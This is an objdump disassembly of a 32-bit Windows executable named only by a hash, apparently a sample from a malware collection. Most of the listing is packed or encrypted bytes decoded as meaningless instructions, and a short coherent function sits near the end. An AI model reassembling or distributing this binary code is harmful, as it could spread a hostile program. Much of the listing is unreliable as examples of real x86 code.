
ddc00733e6c3eb59f15b8932e9aadbc140785063fda9fbdf9442ddb16139c467.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	sub    al,0x81
  4d0002:	or     BYTE PTR ds:0x3a8f9d99,0xd7
  4d0009:	pop    esp
  4d000a:	outs   dx,DWORD PTR ds:[esi]
  4d000b:	xchg   esp,eax
  4d000c:	ret    0xe696
  4d000f:	jge    0x4cfffd
  4d0011:	or     al,0xc8
  4d0013:	stos   BYTE PTR es:[edi],al
  4d0014:	cmp    DWORD PTR [esi-0xb],esi
  4d0017:	add    bl,BYTE PTR [eax]
  4d0019:	loop   0x4cffb5
  4d001b:	lea    edx,[edi+eiz*8]
  4d001e:	call   0x75baf056
  4d0023:	scas   al,BYTE PTR es:[edi]
  4d0024:	push   cs
  4d0025:	push   ss
  4d0026:	dec    edi
  4d0027:	inc    esi
  4d0028:	fcomi  st,st(7)
  4d002a:	mov    al,0xb9
  4d002c:	mov    BYTE PTR es:[ecx-0x1d223ba9],cl
  4d0033:	fld    TBYTE PTR [edi+0x50]
  4d0036:	adc    DWORD PTR [eax-0x40295002],0x6af45084
  4d0040:	fidiv  WORD PTR [ebx+ecx*1]
  4d0043:	ins    BYTE PTR es:[edi],dx
  4d0044:	scas   al,BYTE PTR es:[edi]
  4d0045:	mov    ds:0xdd8fd6f8,eax
  4d004a:	jg     0x4d00c5
  4d004c:	jb     0x4cfff0
  4d004e:	test   BYTE PTR [esi+0x6c638905],al
  4d0054:	add    DWORD PTR [edi-0x64],esi
  4d0057:	lock mov edi,DWORD PTR [esi+0x1d]
  4d005b:	and    BYTE PTR [esi-0x7f],dh
  4d005e:	loop   0x4cffec
  4d0060:	jae    0x4d00d3
  4d0062:	and    BYTE PTR [ebx-0x72],dh
  4d0065:	pop    ss
  4d0066:	mov    DWORD PTR es:[ebp-0x22],edx
  4d006a:	inc    esp
  4d006b:	ficom  DWORD PTR [ebx+eiz*2]
  4d006e:	daa    
  4d006f:	xchg   edx,eax
  4d0070:	pop    esp
  4d0071:	add    eax,0x6b06d321
  4d0076:	xor    eax,DWORD PTR [eax+0x8d4eafa]
  4d007c:	or     eax,0x3a5f2b7f
  4d0081:	repz cmp DWORD PTR [esi],eax
  4d0084:	das    
  4d0085:	push   ebp
  4d0086:	sub    ebx,DWORD PTR [ebx+0x42]
  4d0089:	jmp    DWORD PTR [edi]
  4d008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d008c:	adc    al,0x9
  4d008e:	popa   
  4d008f:	mov    ds:0x766379f1,al
  4d0094:	jp     0x4d005c
  4d0096:	add    al,0x8a
  4d0098:	xchg   edi,eax
  4d0099:	cmp    ebx,edi
  4d009b:	fisttp QWORD PTR [esi]
  4d009d:	int    0x4
  4d009f:	and    bl,BYTE PTR [ebp+0x33]
  4d00a2:	cli    
  4d00a3:	xor    esi,DWORD PTR [edi+edx*2-0x57132e02]
  4d00aa:	add    DWORD PTR [esi],ebp
  4d00ac:	gs in  al,0xb3
  4d00af:	mov    ds:0x174c1b95,al
  4d00b4:	adc    bl,ch
  4d00b6:	mov    bl,0xe8
  4d00b8:	in     al,0xb9
  4d00ba:	verr   WORD PTR [esi-0x47000fb5]
  4d00c1:	adc    dl,BYTE PTR [edi+0x51436d34]
  4d00c7:	lds    ebx,FWORD PTR [eax-0x5fdd5144]
  4d00cd:	dec    eax
  4d00ce:	push   ecx
  4d00cf:	fucomp st(4)
  4d00d1:	scas   eax,DWORD PTR es:[edi]
  4d00d2:	sbb    DWORD PTR [ebx],esp
  4d00d4:	jg     0x4d0126
  4d00d6:	in     eax,0x52
  4d00d8:	out    0x6,al
  4d00da:	sbb    al,BYTE PTR [ebx]
  4d00dc:	inc    ebx
  4d00dd:	test   BYTE PTR [ebx],dh
  4d00df:	sub    BYTE PTR gs:[eax+eiz*1-0xd],bh
  4d00e4:	fdivr  DWORD PTR [eax-0x6285a2fd]
  4d00ea:	push   ebx
  4d00eb:	mov    ds:0xb5048edc,al
  4d00f0:	and    al,0xc7
  4d00f2:	adc    esi,DWORD PTR [ebx]
  4d00f4:	push   es
  4d00f5:	cmp    al,0xec
  4d00f7:	int3   
  4d00f8:	xchg   BYTE PTR [edx],cl
  4d00fa:	push   eax
  4d00fb:	sar    BYTE PTR [edi-0x5],0x15
  4d00ff:	aaa    
  4d0100:	ret    0xea1a
  4d0103:	call   0x6f9bfcbc
  4d0108:	cmp    DWORD PTR [eax-0x3e],0xa7bbd81b
  4d010f:	call   0x17d545a5
  4d0114:	jo     0x4d00d0
  4d0116:	call   0x6d91e553
  4d011b:	xlat   BYTE PTR ds:[ebx]
  4d011c:	test   al,0x38
  4d011e:	(bad)  
  4d011f:	js     0x4d00ce
  4d0121:	xor    DWORD PTR ds:0x50cda7de,eax
  4d0127:	cs scas al,BYTE PTR es:[edi]
  4d0129:	pushf  
  4d012a:	mov    cl,0x28
  4d012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d012d:	mov    ecx,0x41e6a6d9
  4d0132:	sbb    bh,dh
  4d0134:	jns    0x4d00f3
  4d0136:	cmp    ecx,DWORD PTR [esi]
  4d0138:	loopne 0x4d0107
  4d013a:	xchg   edx,eax
  4d013b:	cmc    
  4d013c:	push   0x6e
  4d013e:	cli    
  4d013f:	sub    DWORD PTR [edi+0x619c5d1c],0xffffff9a
  4d0146:	in     al,0x77
  4d0148:	mov    ds:0xa73f2b5d,eax
  4d014d:	test   al,0x34
  4d014f:	dec    esp
  4d0150:	mov    eax,ds:0xd474506b
  4d0155:	aad    0x3a
  4d0157:	shl    DWORD PTR ds:0x6a185af,cl
  4d015d:	cmp    DWORD PTR [ebx+eiz*2],ecx
  4d0160:	sti    
  4d0161:	(bad)  
  4d0162:	jle    0x4d01c9
  4d0164:	xchg   ecx,eax
  4d0165:	and    BYTE PTR [ebp+0x5a81e582],0x7d
  4d016c:	pop    ds
  4d016d:	cmc    
  4d016e:	mov    ecx,0xd11b5981
  4d0173:	std    
  4d0174:	mov    ah,0xe7
  4d0176:	sub    DWORD PTR [esi-0x63],ebx
  4d0179:	mov    ds:0xadb4f4aa,eax
  4d017e:	lods   al,BYTE PTR ds:[esi]
  4d017f:	pop    esp
  4d0180:	lahf   
  4d0181:	mov    esp,0x42b9f457
  4d0186:	(bad)  
  4d0187:	pop    ss
  4d0188:	mov    eax,ds:0x533fc1f0
  4d018d:	mov    edx,0x39794b9d
  4d0192:	pop    es
  4d0193:	mov    ah,0xdd
  4d0195:	rcl    BYTE PTR [eax-0x53],cl
  4d0198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0199:	hlt    
  4d019a:	xlat   BYTE PTR ds:[ebx]
  4d019b:	xor    al,0xb
  4d019d:	hlt    
  4d019e:	xor    ecx,esp
  4d01a0:	test   BYTE PTR [ebx],0xb4
  4d01a3:	mov    ch,0xb
  4d01a5:	hlt    
  4d01a6:	dec    ebx
  4d01a7:	mov    ds:0x5df40c5e,al
  4d01ac:	mov    ds:0xb40a81f2,eax
  4d01b1:	cwde   
  4d01b2:	jns    0x4d0135
  4d01b4:	cmp    eax,0xc4829150
  4d01b9:	scas   eax,DWORD PTR es:[edi]
  4d01ba:	sar    BYTE PTR [edx+esi*2-0x80],cl
  4d01be:	sub    eax,0x5dd78f83
  4d01c3:	mov    ebp,0x4ee2b37e
  4d01c8:	mov    esp,0x492535a4
  4d01cd:	out    0xca,al
  4d01cf:	lds    ebp,FWORD PTR [edi+0x555e41a5]
  4d01d5:	mov    ds:0x851d2cfa,eax
  4d01da:	or     dl,cl
  4d01dc:	ins    DWORD PTR es:[edi],dx
  4d01dd:	repz movsx eax,WORD PTR [ecx+ebp*1]
  4d01e2:	push   esi
  4d01e3:	cmp    BYTE PTR [esi],bh
  4d01e5:	in     eax,dx
  4d01e6:	test   eax,0xba1f38e7
  4d01eb:	mov    ecx,0x4645e0e1
  4d01f0:	stos   DWORD PTR es:[edi],eax
  4d01f1:	pop    edi
  4d01f2:	jmp    0x4713:0x14a8ce42
  4d01f9:	aas    
  4d01fa:	(bad)  
  4d01fb:	out    dx,eax
  4d01fc:	mov    edx,0x9fd9fac0
  4d0201:	enter  0x4a79,0x7e
  4d0205:	cwde   
  4d0206:	(bad)  
  4d0207:	popf   
  4d0208:	shr    BYTE PTR [ebx+0x29],0x62
  4d020c:	cdq    
  4d020d:	adc    eax,0xec68f64f
  4d0212:	mov    al,0x9
  4d0214:	push   cs
  4d0215:	and    ebx,edx
  4d0217:	cli    
  4d0218:	pop    ss
  4d0219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d021a:	sub    ch,BYTE PTR [ecx]
  4d021c:	jmp    0x4f19:0x16d6d55b
  4d0223:	sub    eax,0x96711a3b
  4d0228:	es jno 0x4d01ad
  4d022b:	ins    DWORD PTR es:[edi],dx
  4d022c:	push   ecx
  4d022d:	retf   
  4d022e:	or     BYTE PTR [ecx+0x30],cl
  4d0231:	xor    eax,0xc156b6f7
  4d0236:	jge    0x4d01f4
  4d0238:	scas   al,BYTE PTR es:[edi]
  4d0239:	xor    DWORD PTR [esi],ecx
  4d023b:	ret    0x535f
  4d023e:	icebp  
  4d023f:	mov    dl,0xc
  4d0241:	mov    al,0x9
  4d0243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0244:	hlt    
  4d0245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0246:	cli    
  4d0247:	(bad)  
  4d0249:	iret   
  4d024a:	or     DWORD PTR [edi+0x33],esi
  4d024d:	xchg   dh,dh
  4d024f:	fsub   DWORD PTR [eax*1-0x121fc880]
  4d0256:	or     eax,edi
  4d0258:	into   
  4d0259:	xchg   edi,eax
  4d025a:	mov    ah,0xae
  4d025c:	cs xchg esp,eax
  4d025e:	inc    edx
  4d025f:	frstor [ecx-0x4b8cf136]
  4d0265:	lahf   
  4d0266:	cmc    
  4d0267:	frstor [edi+ebx*2+0x2bb32e60]
  4d026e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d026f:	push   esi
  4d0270:	push   cs
  4d0271:	gs jmp 0xcbff:0xa2ab3934
  4d0279:	stos   DWORD PTR es:[edi],eax
  4d027a:	or     al,BYTE PTR [esi+0x2310c8f6]
  4d0280:	or     esi,DWORD PTR [edi]
  4d0282:	out    dx,eax
  4d0283:	pop    esp
  4d0284:	imul   ecx,ebp,0xffffff9d
  4d0287:	out    0x99,eax
  4d0289:	xor    al,0x87
  4d028b:	pop    ss
  4d028c:	addr16 retf 
  4d028e:	clc    
  4d028f:	cmp    BYTE PTR [ecx+0x67db2ba9],bl
  4d0295:	lods   al,BYTE PTR ds:[esi]
  4d0296:	fmul   st(7),st
  4d0298:	test   DWORD PTR [ebx+eax*4],esi
  4d029b:	mov    ss,esp
  4d029d:	and    al,0xd1
  4d029f:	sar    DWORD PTR [esi+0x32],0x2e
  4d02a3:	xchg   esp,eax
  4d02a4:	(bad)  
  4d02a5:	and    eax,0xc5863255
  4d02aa:	cmp    ch,BYTE PTR [edi]
  4d02ac:	ds fwait
  4d02ae:	push   eax
  4d02af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02b0:	dec    esi
  4d02b1:	push   edi
  4d02b2:	mov    bl,0xd1
  4d02b4:	out    dx,eax
  4d02b5:	shl    DWORD PTR [edx+0x6cfe9762],cl
  4d02bb:	and    edi,edi
  4d02bd:	add    DWORD PTR [ebx+0x118c8dde],edx
  4d02c3:	and    dh,BYTE PTR [ebx+esi*2+0x79]
  4d02c7:	xchg   esp,eax
  4d02c8:	sub    eax,0x596b868d
  4d02cd:	imul   ecx,DWORD PTR [ecx+0x76972918],0x375bdbe7
  4d02d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02d8:	push   ds
  4d02d9:	test   al,0xc3
  4d02db:	lods   al,BYTE PTR ds:[esi]
  4d02dc:	outs   dx,BYTE PTR ds:[esi]
  4d02dd:	sbb    al,0x8d
  4d02df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02e0:	in     eax,0x33
  4d02e2:	fstp   QWORD PTR [edi-0x7c]
  4d02e5:	int3   
  4d02e6:	xor    ah,BYTE PTR [eax+0x48508a7d]
  4d02ec:	mov    ch,al
  4d02ee:	sbb    DWORD PTR [ecx+eiz*8+0x2043f63a],edi
  4d02f5:	sbb    al,0x8b
  4d02f7:	rol    BYTE PTR ds:0xfc3f84e4,0x1a
  4d02fe:	ror    esp,1
  4d0300:	add    al,0x3b
  4d0302:	cmp    ecx,DWORD PTR [ebp+0x3af07256]
  4d0308:	cld    
  4d0309:	sbb    al,bl
  4d030b:	xchg   esi,eax
  4d030c:	out    dx,al
  4d030d:	push   0x11
  4d030f:	outs   dx,BYTE PTR ds:[esi]
  4d0310:	inc    esi
  4d0311:	push   ebp
  4d0312:	push   ebp
  4d0313:	aas    
  4d0314:	and    DWORD PTR [ebx+ebp*4-0x10],edx
  4d0318:	push   esp
  4d0319:	mov    ah,0x79
  4d031b:	push   cs
  4d031c:	mov    esp,0x59f2864b
  4d0321:	mov    ebx,0xd201fc5b
  4d0326:	call   0x69cc0752
  4d032b:	sub    ah,bh
  4d032d:	mov    cl,0xfe
  4d032f:	xlat   BYTE PTR ds:[ebx]
  4d0330:	adc    eax,0x6f7f014e
  4d0335:	call   0x2f64:0x9691d103
  4d033c:	sub    BYTE PTR [ecx-0x65],0x27
  4d0340:	add    bl,BYTE PTR [ebx+0x650fd888]
  4d0346:	ja     0x4d036e
  4d0348:	inc    edi
  4d0349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d034a:	xchg   DWORD PTR [edi],ebp
  4d034c:	(bad)  
  4d034d:	mov    dl,0xd1
  4d034f:	sub    BYTE PTR [ebx-0x10b3082e],dl
  4d0355:	mov    cs,ebx
  4d0357:	adc    edi,ebp
  4d0359:	js     0x4d033c
  4d035b:	into   
  4d035c:	add    DWORD PTR ds:0x76c33453,edx
  4d0362:	xchg   ebp,eax
  4d0363:	push   edi
  4d0364:	xor    DWORD PTR [ebx+0x7b],eax
  4d0367:	test   al,0xd0
  4d0369:	mov    esp,0x4330436c
  4d036e:	xchg   ebx,eax
  4d036f:	jbe    0x4d0361
  4d0371:	mov    esp,0x24f9896c
  4d0376:	xchg   ebx,eax
  4d0377:	jbe    0x4d0380
  4d0379:	xor    ah,BYTE PTR [esi]
  4d037b:	xchg   ecx,eax
  4d037c:	cli    
  4d037d:	int    0xd9
  4d037f:	push   esi
  4d0380:	fnsave [ecx]
  4d0382:	es test eax,0x8b659eaf
  4d0388:	jbe    0x4d03a4
  4d038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d038b:	je     0x4d0318
  4d038d:	in     eax,0x43
  4d038f:	push   ebx
  4d0390:	jne    0x4d03ac
  4d0392:	mov    esp,0xe718a38
  4d0397:	mov    al,0x35
  4d0399:	mov    ?,ecx
  4d039b:	dec    edi
  4d039c:	push   DWORD PTR [ecx]
  4d039e:	pop    edi
  4d039f:	jno    0x4d036b
  4d03a1:	aad    0x61
  4d03a3:	xchg   ebx,eax
  4d03a4:	pop    ebx
  4d03a5:	aaa    
  4d03a6:	lahf   
  4d03a7:	jo     0x4d0373
  4d03a9:	je     0x4d0390
  4d03ab:	dec    edi
  4d03ac:	lods   al,BYTE PTR ds:[esi]
  4d03ad:	jl     0x4d0422
  4d03af:	cmp    ecx,DWORD PTR [edi+edi*4+0x51]
  4d03b3:	cmp    DWORD PTR [eax-0x2b5bdc76],edi
  4d03b9:	test   eax,0x56371500
  4d03be:	(bad)  
  4d03bf:	jmp    0xd04e:0x15003fb2
  4d03c6:	mov    dh,0xf7
  4d03c8:	or     DWORD PTR [esi+0x7200c19a],ecx
  4d03ce:	gs ds jmp 0x180e9de8
  4d03d5:	inc    esi
  4d03d6:	dec    esi
  4d03d7:	mov    esi,0xcbb1b9e9
  4d03dc:	mov    WORD PTR [edx+0x6a],gs
  4d03df:	xchg   ebp,eax
  4d03e0:	cmp    bh,ah
  4d03e2:	push   esi
  4d03e3:	push   ebx
  4d03e4:	out    0xd1,al
  4d03e6:	leave  
  4d03e7:	lods   al,BYTE PTR ds:[esi]
  4d03e8:	sbb    ebp,DWORD PTR [esi]
  4d03ea:	jle    0x4d03b3
  4d03ec:	push   ss
  4d03ed:	mov    eax,DWORD PTR [eax+edi*1+0x3bc374eb]
  4d03f4:	ds inc esp
  4d03f6:	pop    ebp
  4d03f7:	(bad)
  4d03fb:	scas   eax,DWORD PTR es:[edi]
  4d03fc:	pop    esi
  4d03fd:	std    
  4d03fe:	sbb    DWORD PTR [eax-0x5d],edx
  4d0401:	add    ch,BYTE PTR [esi]
  4d0403:	and    al,0x76
  4d0405:	mov    dh,0x12
  4d0407:	fmul   QWORD PTR [ebx-0x7967cab7]
  4d040d:	outs   dx,DWORD PTR ds:[esi]
  4d040e:	iret   
  4d040f:	addr16 jnp 0x4d03a2
  4d0412:	js     0x4d0420
  4d0414:	mov    gs,WORD PTR [eax]
  4d0416:	enter  0x73f3,0xd7
  4d041a:	jg     0x4d039c
  4d041c:	mov    ?,WORD PTR [ebx-0x52c926bf]
  4d0422:	dec    ecx
  4d0423:	jl     0x4d0460
  4d0425:	aam    0xa8
  4d0427:	adc    eax,0x75cf71b0
  4d042c:	sahf   
  4d042d:	idiv   BYTE PTR [ebx-0x63791978]
  4d0433:	ja     0x4d03c4
  4d0435:	jl     0x4d049b
  4d0437:	std    
  4d0438:	retf   0xe10e
  4d043b:	bound  edi,QWORD PTR [ecx+esi*4-0x6b314d6d]
  4d0442:	test   al,0x9f
  4d0444:	in     eax,dx
  4d0445:	outs   dx,DWORD PTR ds:[esi]
  4d0446:	push   edi
  4d0447:	pusha  
  4d0448:	adc    al,0x78
  4d044a:	dec    esi
  4d044b:	mov    eax,ds:0x620b87ed
  4d0450:	add    al,0x7c
  4d0452:	in     al,dx
  4d0453:	leave  
  4d0454:	lds    edi,FWORD PTR [edi+0x4db18e88]
  4d045a:	jp     0x4d0442
  4d045c:	lods   al,BYTE PTR ds:[esi]
  4d045d:	mov    ch,0x2
  4d045f:	jbe    0x4d03e1
  4d0461:	xchg   edi,eax
  4d0462:	pop    ecx
  4d0463:	cmovp  ebx,ebp
  4d0466:	mov    cl,0x9d
  4d0468:	pop    es
  4d0469:	push   esi
  4d046a:	adc    BYTE PTR [ebp+0x46d92da5],bh
  4d0470:	ds mov dh,0x88
  4d0473:	jl     0x4d0498
  4d0475:	int    0xf4
  4d0477:	iret   
  4d0478:	fisub  WORD PTR [esi+0x5932181d]
  4d047e:	loop   0x4d0467
  4d0480:	pop    edx
  4d0481:	and    al,0x72
  4d0483:	popf   
  4d0484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0485:	push   eax
  4d0486:	xchg   esp,eax
  4d0487:	or     eax,0xf26c5343
  4d048c:	mov    esi,0x426e570d
  4d0491:	dec    eax
  4d0492:	in     eax,0x1c
  4d0494:	xchg   edi,eax
  4d0495:	inc    ebx
  4d0496:	nop
  4d0497:	das    
  4d0498:	cmc    
  4d0499:	add    eax,eax
  4d049b:	and    BYTE PTR [esi+eiz*2+0x40],bl
  4d049f:	fbstp  TBYTE PTR [ecx-0x5adfed67]
  4d04a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d04a6:	inc    esi
  4d04a7:	xor    bh,ah
  4d04a9:	push   ecx
  4d04aa:	lods   eax,DWORD PTR ds:[esi]
  4d04ab:	je     0x4d04af
  4d04ad:	out    0x52,eax
  4d04af:	mov    edi,edi
  4d04b1:	pusha  
  4d04b2:	ss mov ecx,0x3f54bf26
  4d04b8:	push   0x99c5684d
  4d04bd:	mov    dl,0x97
  4d04bf:	sahf   
  4d04c0:	or     DWORD PTR [esi+0x68],esp
  4d04c3:	popa   
  4d04c4:	clc    
  4d04c5:	and    al,0x8
  4d04c7:	retf   
  4d04c8:	pop    edx
  4d04c9:	inc    ebx
  4d04ca:	clc    
  4d04cb:	xor    al,0xb3
  4d04cd:	mov    esp,0x83a3ca5a
  4d04d2:	xor    al,BYTE PTR [edx+0x16]
  4d04d5:	or     al,0xcf
  4d04d7:	or     eax,0xeabcc376
  4d04dc:	jle    0x4d04c0
  4d04de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04df:	mov    dh,0x9b
  4d04e1:	sbb    eax,0x22f54958
  4d04e6:	aam    0x17
  4d04e8:	iret   
  4d04e9:	cmp    eax,0xc452d4ad
  4d04ee:	push   edx
  4d04ef:	sub    edx,DWORD PTR [edi]
  4d04f1:	pusha  
  4d04f2:	scas   eax,DWORD PTR es:[edi]
  4d04f3:	aam    0xea
  4d04f5:	rol    BYTE PTR [esi-0x6a],cl
  4d04f8:	pop    ss
  4d04f9:	xchg   edi,eax
  4d04fa:	shr    DWORD PTR [eax+0x3f],0x85
  4d04fe:	leave  
  4d04ff:	outs   dx,DWORD PTR ds:[esi]
  4d0500:	push   ss
  4d0501:	into   
  4d0502:	xor    eax,0xebd1fe6
  4d0507:	inc    BYTE PTR ds:[ebp+0x31]
  4d050b:	dec    BYTE PTR [esi+0x73028f3a]
  4d0511:	(bad)
  4d0514:	add    bh,BYTE PTR [eax+edx*2]
  4d0517:	xchg   esi,eax
  4d0518:	push   edx
  4d0519:	ret    
  4d051a:	add    eax,0x6ffd34a2
  4d051f:	inc    ebx
  4d0520:	and    BYTE PTR [edx],al
  4d0522:	out    0xd4,al
  4d0524:	(bad)
  4d0529:	cmp    eax,0xde86474a
  4d052e:	push   ss
  4d052f:	jl     0x4d050c
  4d0531:	mov    DWORD PTR [ebp-0x10],edx
  4d0534:	es jbe 0x4d0549
  4d0537:	or     BYTE PTR [edi-0x48],0x51
  4d053b:	out    0x1f,al
  4d053d:	mov    ebx,0x44367d24
  4d0542:	xor    DWORD PTR [edi-0x7ebb83b0],eax
  4d0548:	add    eax,0x817f1183
  4d054d:	cmp    eax,0xc2eace63
  4d0552:	add    al,0x9b
  4d0554:	test   DWORD PTR [ecx-0x3a1d329f],esi
  4d055a:	push   cs
  4d055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d055c:	jae    0x4d04e8
  4d055e:	lock mov al,0x96
  4d0561:	clc    
  4d0562:	rcr    DWORD PTR [ebx-0xa],cl
  4d0565:	idiv   DWORD PTR [eax+edi*8+0x75]
  4d0569:	dec    eax
  4d056a:	in     eax,dx
  4d056b:	push   cs
  4d056c:	loop   0x4d0524
  4d056e:	push   0xeb9977fd
  4d0573:	push   edx
  4d0574:	hlt    
  4d0575:	ins    DWORD PTR es:[edi],dx
  4d0576:	push   0xffffff95
  4d0578:	xor    edx,DWORD PTR [edx-0x55a6956b]
  4d057e:	mov    ss,WORD PTR [esi]
  4d0580:	outs   dx,DWORD PTR ds:[esi]
  4d0581:	push   0x192e971
  4d0586:	xchg   esi,eax
  4d0587:	outs   dx,DWORD PTR ds:[esi]
  4d0588:	bound  esp,QWORD PTR [ebx+0x8651bb1]
  4d058e:	fsub   QWORD PTR [edx-0x6b]
  4d0591:	test   al,0x8c
  4d0593:	inc    edi
  4d0594:	les    eax,FWORD PTR [edx]
  4d0596:	and    al,0x7c
  4d0598:	out    0xfc,eax
  4d059a:	xor    DWORD PTR [eax+0x7c928672],edx
  4d05a0:	lock cmp al,0xc6
  4d05a3:	and    cl,0x18
  4d05a6:	and    bl,BYTE PTR [eax+eiz*1]
  4d05a9:	out    0xdd,eax
  4d05ab:	inc    eax
  4d05ac:	outs   dx,BYTE PTR ds:[esi]
  4d05ad:	pop    esi
  4d05ae:	xchg   edx,eax
  4d05af:	inc    edx
  4d05b0:	push   ebx
  4d05b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d05b2:	test   BYTE PTR [ecx],0xd2
  4d05b5:	imul   esp,DWORD PTR [esi-0x2],0x199962f
  4d05bc:	shr    BYTE PTR [ecx-0x32],cl
  4d05bf:	(bad)  
  4d05c0:	das    
  4d05c1:	xchg   esi,eax
  4d05c2:	xor    esp,eax
  4d05c4:	cmp    BYTE PTR [ebp-0x4f7c5d3c],bl
  4d05ca:	xchg   ebp,eax
  4d05cb:	ret    
  4d05cc:	sub    esi,DWORD PTR [esi+0x524a0c9d]
  4d05d2:	jecxz  0x4d05b5
  4d05d4:	mov    ecx,0x331e1cbd
  4d05d9:	xor    BYTE PTR [ecx+0x40],dh
  4d05dc:	int3   
  4d05dd:	push   esp
  4d05de:	mov    ?,WORD PTR ds:0x4e83726
  4d05e4:	inc    ecx
  4d05e5:	sub    DWORD PTR [eax+0x40],0x4d
  4d05e9:	mov    cl,0xb5
  4d05eb:	and    eax,0xaa7db561
  4d05f0:	adc    eax,0x1fa7462b
  4d05f5:	sahf   
  4d05f6:	sti    
  4d05f7:	and    DWORD PTR [edx+ebx*8+0x105ff008],0xffffffef
  4d05ff:	inc    ebx
  4d0600:	(bad)  
  4d0602:	rcr    BYTE PTR [esi-0x130f9965],cl
  4d0608:	jecxz  0x4d060b
  4d060a:	jp     0x4d0623
  4d060c:	xchg   dh,bh
  4d060e:	xchg   ebp,eax
  4d060f:	call   0x18215e8f
  4d0614:	test   ebp,edi
  4d0616:	cmp    esi,DWORD PTR [ebx+0x6c]
  4d0619:	test   BYTE PTR [eax+0x4f7b9691],dh
  4d061f:	stc    
  4d0620:	addr16 in eax,dx
  4d0622:	mov    ah,0x7
  4d0624:	call   0x7e43:0x664ba212
  4d062b:	push   ds
  4d062c:	fwait
  4d062d:	and    al,0x2
  4d062f:	loop   0x4d0697
  4d0631:	(bad)  [edi+0x21]
  4d0634:	add    eax,0x64e00225
  4d0639:	(bad)  
  4d063b:	pop    ds
  4d063c:	sbb    eax,0x836017c
  4d0641:	add    eax,0xfafacec3
  4d0646:	cmp    al,0xf4
  4d0648:	xchg   edi,eax
  4d0649:	pop    ebp
  4d064a:	ret    0x65dc
  4d064d:	ja     0x4d062f
  4d064f:	test   BYTE PTR [esi],ah
  4d0651:	lds    esp,FWORD PTR [ebx]
  4d0653:	enter  0xf328,0x8b
  4d0657:	add    al,0xb6
  4d0659:	dec    eax
  4d065a:	or     eax,0x3b436b82
  4d065f:	loopne 0x4d06d8
  4d0661:	das    
  4d0662:	sahf   
  4d0663:	cmp    ebp,DWORD PTR [edx-0x73]
  4d0666:	inc    eax
  4d0667:	xor    DWORD PTR [edx],esi
  4d0669:	and    DWORD PTR [ebx+eiz*4-0x71],ebx
  4d066d:	add    ch,ch
  4d066f:	clc    
  4d0670:	dec    edx
  4d0671:	imul   eax,eax,0x1e
  4d0674:	mov    ch,0x5e
  4d0676:	jmp    0x77c2:0xb00d9266
  4d067d:	jne    0x4d06da
  4d067f:	in     al,0x43
  4d0681:	jno    0x4d063e
  4d0683:	sbb    al,0xfe
  4d0685:	stos   BYTE PTR es:[edi],al
  4d0686:	inc    ebp
  4d0687:	outs   dx,BYTE PTR ds:[esi]
  4d0688:	mov    esi,0xd0599c9d
  4d068d:	and    eax,eax
  4d068f:	int3   
  4d0690:	xor    esi,DWORD PTR [ecx+0x7f]
  4d0693:	jmp    0x7133:0x15808ece
  4d069a:	jg     0x4d0686
  4d069c:	into   
  4d069d:	mov    es,WORD PTR [eax+0x7f713315]
  4d06a3:	jmp    0x7133:0x15808ece
  4d06aa:	jg     0x4d0696
  4d06ac:	into   
  4d06ad:	mov    es,WORD PTR [eax+0x7fd23315]
  4d06b3:	jmp    0x7e33:0x158585ce
  4d06ba:	jp     0x4d06a6
  4d06bc:	push   edi
  4d06bd:	mov    ah,BYTE PTR [ebx+ecx*1-0x4b]
  4d06c1:	lds    edi,FWORD PTR [esi]
  4d06c3:	xchg   edx,eax
  4d06c4:	int3   
  4d06c5:	mov    ecx,0x27be6be
  4d06ca:	or     al,BYTE PTR [ebx+0x13de69bc]
  4d06d0:	es adc bl,al
  4d06d3:	outs   dx,BYTE PTR ds:[esi]
  4d06d4:	leave  
  4d06d5:	dec    eax
  4d06d6:	lock xchg DWORD PTR [esi-0x6c1a1c3c],esi
  4d06dd:	pop    ebx
  4d06de:	dec    esp
  4d06df:	push   es
  4d06e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d06e1:	mov    eax,ds:0x89c95dca
  4d06e6:	dec    eax
  4d06e7:	push   0x55889ca4
  4d06ec:	mov    edi,edi
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x24
  4d06f4:	lea    esi,[edx+0x98]
  4d06fa:	sub    edi,ebx
  4d06fc:	push   esi
  4d06fd:	push   ecx
  4d06fe:	push   edx
  4d06ff:	push   ecx
  4d0700:	push   edi
  4d0701:	call   0x4d0c98
  4d0706:	add    esp,0x10
  4d0709:	pop    esi
  4d070a:	mov    eax,0xfffffff4
  4d070f:	push   eax
  4d0710:	call   0x4d1000
  4d0715:	add    esp,0x4
  4d0718:	mov    edx,0x0
  4d071d:	push   edx
  4d071e:	call   0x4d14ac
  4d0723:	add    esp,0x4
  4d0726:	add    esp,0x24
  4d0729:	pop    ebp
  4d072a:	ret    
  4d072b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0731:	sub    esp,0x5c
  4d0734:	lea    edx,[eax-0x68]
  4d0737:	and    DWORD PTR [edx+0x24],0x623d
  4d073e:	push   edx
  4d073f:	push   ecx
  4d0740:	push   DWORD PTR [edx+0x120]
  4d0746:	call   0x4d1460
  4d074b:	add    esp,0x8
  4d074e:	pop    edx
  4d074f:	push   edx
  4d0750:	call   0x4d1520
  4d0755:	add    esp,0x4
  4d0758:	pop    edx
  4d0759:	push   edx
  4d075a:	call   0x4d0ae8
  4d075f:	add    esp,0x4
  4d0762:	pop    edx
